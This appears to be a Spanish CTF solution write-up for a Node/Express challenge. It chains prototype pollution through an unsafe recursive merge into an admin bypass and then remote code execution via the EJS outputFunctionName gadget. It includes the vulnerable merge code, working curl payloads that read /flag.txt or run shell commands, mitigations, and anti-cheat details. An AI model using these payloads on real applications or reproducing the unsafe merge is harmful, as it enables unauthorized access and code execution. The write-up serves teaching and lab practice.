# Solución — web-proto-03 · Prototype of Doom

**Categoría:** web · **Dificultad:** insane · **Vuln central:** **Prototype
Pollution** (Node/Express) encadenada a **bypass de autorización** + **RCE en
SSR** vía el gadget `outputFunctionName` de **EJS**.

## Resumen

"Doom Templates" es un editor de plantillas de correo. Cada visitante tiene un
*perfil* con `settings`; el endpoint `POST /api/templates/save` **fusiona** el
JSON que envías sobre ese perfil con un merge recursivo casero (`mergeDeep`).
Ese merge **no filtra** las claves `__proto__` / `constructor` / `prototype`,
así que un body JSON anidado contamina `Object.prototype` para **todo el
proceso** Node. A partir de ahí, todo objeto "plano" hereda lo que inyectes.

El objetivo (`/flag.txt`, escrito desde `env FLAG` en el arranque) **no se sirve
por ningún endpoint**: hay que llegar por RCE.

## La vulnerabilidad

`mergeDeep` (en `app/app.js`) recorre **todas** las claves del source con
`for (const key in source)` y recursa sobre objetos:

```js
function mergeDeep(target, source) {
  for (const key in source) {              // <- itera "__proto__" si viene de JSON.parse
    if (isObject(source[key])) {
      if (!isObject(target[key])) target[key] = {};
      mergeDeep(target[key], source[key]); // <- recursión: escala a Object.prototype
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

> **Detalle clave (`__proto__`):** un *objeto literal* JS `{ "__proto__": ... }`
> trata `__proto__` como el setter especial y **no** lo expone como propiedad
> propia. Pero `JSON.parse('{"__proto__":...}')` —exactamente lo que hace
> `express.json()` con tu body— crea `"__proto__"` como **propiedad propia
> enumerable**. Por eso el `for..in` la itera y la asignación
> `target["__proto__"][k] = v` contamina el prototipo. Sin pasar por JSON, no
> funciona: ese matiz es parte de la dificultad.

## Cadena de explotación

### 1) Auth bypass — inyectar `role: admin`

`/admin/render` está reservado a admins. La "sesión" es un objeto plano sin
`role`/`isAdmin`, así que **hereda** lo que contamines:

```js
const session = {};
const isAdmin = session.role === 'admin' || session.isAdmin === true; // hereda del proto
```

Contaminamos:

```bash
curl -s -X POST http://<host>:8080/api/templates/save \
  -H 'Content-Type: application/json' \
  -d '{"settings":{"__proto__":{"role":"admin"}}}'
```

Tras esto, `({}).role === "admin"` en todo el proceso → el gate de
`/admin/render` se abre **sin credenciales**.

### 2) RCE en SSR — gadget `outputFunctionName` de EJS

`/admin/render` compila la plantilla con `ejs.render(tpl, data, options)` y pasa
`options = {}` (vacío, sin filtrar). EJS lee de `options` claves de
configuración (`outputFunctionName`, `escapeFunction`, `localsName`, `client`,
`destructuredLocals`…). Con el prototipo contaminado, esas opciones llegan
**contaminadas**. En el `compile` de EJS:

```js
if (opts.outputFunctionName) {
  prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```

`opts.outputFunctionName` se **concatena sin sanear** dentro del cuerpo de la
función compilada. Inyectamos código rompiendo la declaración:

```
var x;__append(<flag>);var y = __append;
```

Payload (`__append(s)` concatena `s` al `__output` que `/admin/render`
devuelve):

```bash
curl -s -X POST http://<host>:8080/api/templates/save \
  -H 'Content-Type: application/json' \
  -d '{"settings":{"__proto__":{"outputFunctionName":"x;__append(process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\",\"utf8\"));var y"}}}'
```

### 3) Disparar el render → leer la flag

```bash
curl -s -X POST http://<host>:8080/admin/render \
  -H 'Content-Type: application/json' -d '{"template":"[doom]"}'
# -> {"rendered":"flag{...}\n[doom]"}
```

`process.mainModule.require('child_process').execSync('cat /flag.txt')` es
equivalente y también funciona (RCE plena, no solo lectura de archivo).

**Exploit automatizado:** `python solution/exploit.py http://<host>:8080`.

Verificado localmente (Node 20, EJS 3.1.6): la cadena devuelve
`{"rendered":"flag{...}[doom]"}` con la flag del env / `/flag.txt`.

## Por qué es INSANE

- No es `isAdmin:true` y listo: hay que (1) **descubrir** que el merge es
  recursivo e inseguro, (2) entender el matiz `JSON.parse` vs literal para que
  `__proto__` contamine, (3) encadenar **dos** efectos de la misma
  contaminación (auth bypass + RCE), y (4) conocer el **gadget concreto** de EJS
  (`outputFunctionName`) y construir un payload sintácticamente válido
  (`var x;CODE;var y`).
- El objetivo (`/flag.txt`) **no se expone**: solo se obtiene ejecutando código.
- La contaminación es **por-proceso**: aislada por contenedor de equipo.

## Mitigaciones (didáctico)

- Merge seguro: rechazar claves `__proto__`/`constructor`/`prototype`, o usar
  `Object.create(null)`, `Map`, o librerías sin pollution (lodash ≥ 4.17.21 con
  `mergeWith` saneado). Congelar el prototipo: `Object.freeze(Object.prototype)`.
- No pasar `options` controlables (ni `{}` que hereda del prototipo) a motores
  de plantillas; fijar `options` con `Object.create(null)` y propiedades
  explícitas. Actualizar EJS y evitar `outputFunctionName` dinámico.
- Autorización basada en datos verificados (token/sesión firmada), nunca en
  lectura de propiedades de objetos planos heredables.

## Nota anti-cheat

La flag es **dinámica y única por equipo** (HMAC del flag-service,
`ARCHITECTURE §4`), inyectada por `env FLAG` y escrita a `/flag.txt` en el
arranque de la instancia del equipo. El servicio **no publica puertos al host**:
solo es alcanzable por la VPN del propio equipo (`172.30.{N}.16:8080`). La
contaminación del prototipo es **por-proceso**, así que cada equipo explota SU
instancia para SU flag; compartir la técnica no da puntos y enviar la flag de
otro equipo dispara `cheat_flag_share` (`/whose-flag`). El servicio emite
eventos SIEM al collector: `proto_pollution_attempt` (warn, al detectar
`__proto__`/`constructor`/`prototype` en el body) y `admin_render_invoked`
(alert, cuando el gate admin se abre vía contaminación). El `reqlog` (CTFREQ)
loguea cada petición completa para el overlay del stream.
